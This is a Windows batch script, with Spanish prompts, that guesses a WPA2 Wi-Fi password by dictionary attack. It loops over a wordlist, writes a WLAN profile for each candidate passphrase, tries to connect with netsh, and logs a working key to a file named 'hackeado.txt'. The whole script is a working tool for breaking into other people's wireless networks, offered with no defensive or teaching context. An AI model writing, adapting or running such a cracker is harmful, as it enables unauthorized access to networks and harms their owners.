@echo off
rem C:\Users\PGX\Desktop\diccionarios\dictwifi.txt
color 0A
setlocal enabledelayedexpansion
NETSH WLAN DISCONNECT >nul 2>nul
set /a n=0
set name=fichero.xml
set /p ssid=SSID/ NOMBRE DEL WIFI : 
set /p diccionario=RUTA DEL DICCIONARIO : 
echo.
for /f "delims=" %%a in (%diccionario%) do (
	set /a n+=1
echo ^<?xml version="1.0"?^>>%name%
echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>>>%name%
echo	^<name^>%ssid%^</name^>>>%name%
echo	^<SSIDConfig^>>>%name%
echo		^<SSID^>>>%name%
echo			^<name^>%ssid%^</name^>>>%name% 
echo		^</SSID^>>>%name%
echo	^</SSIDConfig^>>>%name%
echo	^<connectionType^>ESS^</connectionType^>>>%name% 
echo	^<connectionMode^>auto^</connectionMode^>>>%name%
echo	^<MSM^>>>%name%
echo		^<security^>>>%name% 
echo			^<authEncryption^>>>%name% 
echo				^<authentication^>WPA2PSK^</authentication^>>>%name% 
echo				^<encryption^>AES^</encryption^>>>%name%
echo				^<useOneX^>false^</useOneX^>>>%name%
echo			^</authEncryption^>>>%name%
echo			^<sharedKey^>>>%name%
echo				^<keyType^>passPhrase^</keyType^>>>%name% 
echo				^<protected^>false^</protected^>>>%name%
echo				^<keyMaterial^>%%a^</keyMaterial^>>>%name%
echo			^</sharedKey^>>>%name%
echo		^</security^>>>%name%
echo	^</MSM^>>>%name%
echo ^</WLANProfile^>>>%name%


netsh wlan add profile filename="%name%" >nul 2>nul
netsh wlan connect name="%ssid%" >nul 2>nul
timeout /t 1 /nobreak >nul
NETSH WLAN SHOW INTERFACE | FIND /I "CONECTADO">nul 2>nul
if !ERRORLEVEL! EQU 0 (
echo.
echo --------------------------------------
echo CORRECTO %%a ^(!n!^)
echo La clave de %ssid% es : %%a>>hackeado.txt
echo --------------------------------------
pause>nul
	) else (
	
echo CLAVE INVALIDA ---^> [ %%a ] ^(!n!^)
	)
)

pause>nul